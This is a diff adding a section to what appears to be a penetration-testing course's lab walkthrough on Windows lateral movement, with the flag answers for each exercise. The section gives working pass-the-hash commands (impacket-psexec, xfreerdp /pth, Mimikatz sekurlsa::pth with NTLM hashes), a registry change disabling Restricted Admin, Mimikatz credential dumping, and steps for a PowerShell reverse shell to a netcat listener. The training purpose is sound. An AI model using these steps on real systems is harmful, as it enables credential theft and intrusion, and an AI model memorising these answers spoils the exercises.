@@ -432,3 +432,96 @@ python3 laZagne.py browsers
     * <mark style="color:green;">**J0rd@n5**</mark>
 
 <figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+## Windows Lateral Movement
+
+### Pass the hash (PtH)
+
+#### Questions
+
+**Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.**
+
+`impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`
+
+<mark style="color:green;">**G3t\_4CCE\$$\_V1@\_PTH**</mark>
+
+
+
+**Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.**
+
+<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:green;">**DisableRestrictedAdmin**</mark>
+
+**Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?**
+
+`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
+
+`xfreerdp /v:10.129.92.104 /u:administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453`
+
+`run mimikatz`
+
+privilege::debug
+
+sekurlsa::logonpasswords full
+
+<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:green;">**c39f2beb3d2ec06a62cb887fb391dee0**</mark>
+
+**Using David's hash, perform a Pass the Hash attack to connect to the shared folder \DC01\david and read the file david.txt.**
+
+*   MIMIKATZ
+
+    * `sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.local /run:cmd.exe`
+
+    <figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+
+    * `dir \dc01\david`
+    * `type \dc01\david\david.txt`
+
+<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:green;">**D3V1d\_Fl5g\_is\_Her3**</mark>
+
+**Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \DC01\julio and read the file julio.txt.**
+
+* `sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.local /run:cmd.exe`
+  * `type \dc01\julio\julio.txt`
+
+<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:green;">**JuL1()\_SH@re\_fl@g**</mark>
+
+**Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.**
+
+* Julios hash: 64f12cddaa88057e06a81b54e73b949b
+*   Craft reverse shell
+
+    * [https://www.revshells.com/](https://www.revshells.com/)
+    * set IP + port
+
+    <figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+
+    * option PowerShell #3 (Base64)
+
+    <figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+
+
+
+    * Netcat listener
+
+    <figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+
+
+* Run command
+
+<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+
+*   Obtain reverse Shell & get flag
+
+    <figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:green;">**JuL1()\_N3w\_fl@g**</mark>
